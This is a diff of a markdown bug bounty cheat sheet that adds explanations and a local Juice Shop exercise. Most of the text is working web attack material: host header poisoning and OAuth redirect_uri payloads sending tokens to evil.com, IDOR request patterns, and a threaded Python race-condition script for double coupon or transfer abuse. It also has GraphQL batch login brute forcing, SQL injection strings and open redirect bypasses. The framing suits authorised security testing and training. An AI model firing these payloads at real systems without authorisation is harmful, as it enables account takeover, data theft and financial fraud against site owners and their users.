@@ -2,11 +2,19 @@
 
 > Quick-reference payloads optimized for bug bounty hunting scenarios.
 
+> 📋 **What You Will Do In This Section**
+> - [ ] Test for account takeover via host header poisoning and OAuth flaws
+> - [ ] Hunt IDORs with sequential IDs, UUIDs, and method-based techniques
+> - [ ] Exploit race conditions with concurrent requests
+> - [ ] Discover GraphQL schema via introspection and bypass rate limiting
+> - [ ] Detect subdomain takeover opportunities
+
 ---
 
-## 🔴 High-Value Bug Bounty Payloads
+## 🔴 Account Takeover Payloads
 
-### Account Takeover Payloads
+> 💡 **Why This Matters**
+> Account takeover is consistently the highest-paying vulnerability class. Average ATO bounty: $5,000+. These payloads target the password reset flow, OAuth, and session management — where most ATO bugs live.
 
 ```http
 # Password reset → Host header poisoning
@@ -18,17 +26,23 @@ Content-Type: application/json
 # If reset link uses Host header: https://evil.com/reset?token=abc123
 
 # Also try:
-Host: target.com
 X-Forwarded-Host: evil.com
 X-Host: evil.com
+Forwarded: host=evil.com
 
 # OAuth redirect_uri manipulation
 GET /oauth/authorize?client_id=xxx&redirect_uri=https://evil.com/callback&response_type=code
 GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com.evil.com/callback
 GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback/../../../evil.com
+GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback%23@evil.com
 ```
 
-### IDOR Payloads
+---
+
+## 🔴 IDOR Payloads
+
+> 💡 **Why This Matters**
+> IDOR is the most common high-paying vulnerability. Test EVERY endpoint that uses an ID parameter — sequential numbers, UUIDs, encoded strings. Each is a potential $1,000+ finding.
 
 ```
 # Sequential IDs
@@ -38,32 +52,52 @@ GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback/../.
 
 # UUID manipulation
 /api/users/550e8400-e29b-41d4-a716-446655440000
-# Try: Replacing last digits, using UUIDs from other endpoints
+# Try: variant UUIDs from other endpoints
 
-# Method-based IDOR
-GET /api/users/other_user_id          # Might be blocked
-PUT /api/users/other_user_id          # Might work
-DELETE /api/users/other_user_id       # Might work
+# Method-based IDOR (one method blocked, another isn't)
+GET /api/users/other_id          # Might be blocked
+PUT /api/users/other_id          # Might work!
+DELETE /api/users/other_id       # Might work!
+PATCH /api/users/other_id        # Might work!
 
 # Parameter pollution
 /api/users?id=my_id&id=other_id
 /api/users?id[]=my_id&id[]=other_id
 
 # Encoded IDs
-/api/users/BASE64_ENCODED_ID
-/api/users/HASHED_ID
+/api/users/BASE64_ENCODED_ID     # Decode, modify, re-encode
+/api/users/HASHED_ID              # Check if hash is predictable
 ```
 
-### Race Condition Payloads
+#### 🧪 Try It Now — IDOR Quick Test (Juice Shop)
+
+```bash
+echo "=== IDOR Testing on Juice Shop ==="
+echo ""
+echo "1. Login and get your token:"
+echo '   curl -s http://localhost:3000/rest/user/login -H "Content-Type: application/json" -d '\''{"email":"admin@juice-sh.op","password":"admin123"}'\'' | jq .authentication.token'
+echo ""
+echo "2. Test basket IDOR:"
+echo '   for i in $(seq 1 10); do echo "Basket $i:"; curl -s http://localhost:3000/rest/basket/$i -H "Authorization: Bearer TOKEN" | jq .data.id 2>/dev/null; done'
+echo ""
+echo "3. Test user IDOR:"
+echo '   for i in $(seq 1 5); do echo "User $i:"; curl -s http://localhost:3000/api/Users/$i -H "Authorization: Bearer TOKEN" | jq .data.email 2>/dev/null; done'
+```
+
+---
+
+## 🔴 Race Condition Payloads
+
+> 💡 **Why This Matters**
+> Race conditions exploit TOCTOU (time-of-check vs time-of-use) bugs. Send 20 requests simultaneously — if the server doesn't lock properly, you can apply a discount twice, transfer money multiple times, or vote more than once.
 
 ```python
-# Send multiple requests simultaneously to exploit TOCTOU bugs
 import requests
 import threading
 
-url = "https://target.com/api/transfer"
+url = "https://target.com/api/apply-coupon"
 headers = {"Authorization": "Bearer TOKEN"}
-data = {"amount": 1000, "to": "attacker_account"}
+data = {"code": "DISCOUNT50"}
 
 def send():
     requests.post(url, json=data, headers=headers)
@@ -75,38 +109,42 @@ for t in threads:
 for t in threads:
     t.join()
 
-# Use cases:
-# - Transfer money multiple times from one balance
+# Test for:
 # - Apply discount code multiple times
-# - Create resource with same unique constraint
-# - Vote/like multiple times
+# - Transfer money from same balance multiple times
+# - Create account with same email multiple times
+# - Redeem reward/voucher multiple times
 ```
 
-### GraphQL Payloads
+---
+
+## 🔴 GraphQL Payloads
+
+> 💡 **Why This Matters**
+> GraphQL endpoints often expose more data than intended. Introspection reveals the entire API schema, batch queries bypass rate limiting, and nested queries can cause DoS.
 
 ```json
-// Introspection query (discover schema)
+// Introspection query (discover ALL types and fields)
 {"query": "{__schema{types{name fields{name type{name}}}}}"}
 
-// Full introspection
-{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+// IDOR via GraphQL
+{"query": "{ user(id: 1) { email phone ssn } }"}
+{"query": "{ user(id: 2) { email phone ssn } }"}
 
-// Batch queries (bypass rate limiting)
+// Batch queries (bypass rate limiting on login)
 [
   {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
   {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
   {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
 ]
 
-// IDOR via GraphQL
-{"query": "{ user(id: 1) { email phone ssn } }"}
-{"query": "{ user(id: 2) { email phone ssn } }"}
-
 // Injection in GraphQL
 {"query": "{ user(name: \"admin' OR 1=1--\") { id email } }"}
 ```
 
-### Open Redirect Payloads
+---
+
+## 🔴 Open Redirect Payloads
 
 ```
 # Basic
@@ -114,39 +152,33 @@ for t in threads:
 /redirect?url=//evil.com
 /redirect?url=/\evil.com
 
-# Bypass schemes
-/redirect?url=https://evil.com
-/redirect?url=//evil.com
-/redirect?url=////evil.com
-/redirect?url=https:///evil.com
-
-# With allowed domain
+# Bypass with allowed domain
 /redirect?url=https://evil.com?target.com
 /redirect?url=https://target.com@evil.com
 /redirect?url=https://target.com.evil.com
-/redirect?url=https://evil.com#target.com
-/redirect?url=https://evil.com\.target.com
 
 # Encoded
 /redirect?url=https%3A%2F%2Fevil.com
 /redirect?url=%2F%2Fevil.com
-/redirect?url=%252F%252Fevil.com  # Double encode
+/redirect?url=%252F%252Fevil.com   # Double encode
 ```
 
-### Subdomain Takeover Indicators
+---
+
+## 🔴 Subdomain Takeover Indicators
+
+> 💡 **Why This Matters**
+> If a CNAME points to a service that no longer exists, you can claim that service and control the subdomain. This is a reliable $500-2,000 finding.
 
 ```
-# CNAME pointing to services that can be claimed:
-# GitHub Pages:  "There isn't a GitHub Pages site here"
-# Heroku:        "No such app"
-# AWS S3:        "NoSuchBucket"
-# Shopify:       "Sorry, this shop is currently unavailable"
-# Tumblr:        "Whatever you were looking for doesn't currently exist"
-# WordPress.com: "Do you want to register"
-# Fastly:        "Fastly error: unknown domain"
-# Pantheon:      "404 error unknown site"
-# Zendesk:       "Help Center Closed"
-# Azure:         "404 Web Site not found"
+# CNAME → Error message → Takeover possible?
+GitHub Pages:  "There isn't a GitHub Pages site here" → YES
+Heroku:        "No such app" → YES
+AWS S3:        "NoSuchBucket" → YES
+Shopify:       "Sorry, this shop is currently unavailable" → YES
+Azure:         "404 Web Site not found" → YES
+Fastly:        "Fastly error: unknown domain" → YES
+Zendesk:       "Help Center Closed" → YES
 
 # Check: dig CNAME subdomain.target.com
 # If CNAME exists but service returns error → potential takeover
@@ -154,7 +186,7 @@ for t in threads:
 
 ---
 
-## 🔴 Bug Bounty Quick Payloads Cheatsheet
+## 🔴 Quick Payloads Cheatsheet
 
 ```
 SQLi:        ' OR 1=1-- -
@@ -172,21 +204,31 @@ JWT None:    Change alg to "none", remove signature
 
 ---
 
-## 📋 Payload Testing Checklist
+## 📋 Per-Endpoint Testing Checklist
 
 ```
-For each endpoint:
-□ IDOR (change resource IDs)
+For EACH endpoint discovered:
+□ IDOR (change resource IDs with different user's session)
 □ SQL injection (single quote, UNION, SLEEP)
-□ XSS (reflected, stored)
+□ XSS (reflected in response? stored for other users?)
 □ SSRF (if URL parameter exists)
-□ Authentication bypass
-□ CORS misconfiguration
-□ Rate limiting (brute force)
-□ Mass assignment (extra parameters)
+□ Authentication bypass (access without auth token)
+□ CORS misconfiguration (check with evil.com Origin)
+□ Rate limiting (can you brute force?)
+□ Mass assignment (add extra parameters: isAdmin=true)
 □ Business logic (price manipulation, skip steps)
-□ Race conditions (parallel requests)
-□ GraphQL introspection (if GraphQL)
-□ Open redirect (if redirect parameter)
-□ CSRF (if state-changing without token)
+□ Race conditions (parallel requests on state-changing ops)
+□ GraphQL introspection (if GraphQL endpoint)
+□ Open redirect (if redirect parameter exists)
+□ CSRF (if state-changing without anti-CSRF token)
 ```
+
+---
+
+## 🧠 If You're Stuck
+
+1. **Payloads all filtered**: Try encoding (URL, double-URL, Unicode), case variation, and alternative characters
+2. **IDOR returns 403**: Try different HTTP methods (PUT, PATCH, DELETE). Try adding extra headers.
+3. **GraphQL introspection disabled**: Try partial queries: `{__type(name:"User"){fields{name}}}`
+4. **Race condition doesn't work**: Increase simultaneous threads. Use Burp Intruder with "Pitchfork" mode.
+5. **Subdomain takeover CNAME gone**: Someone else claimed it already. Move to the next one.
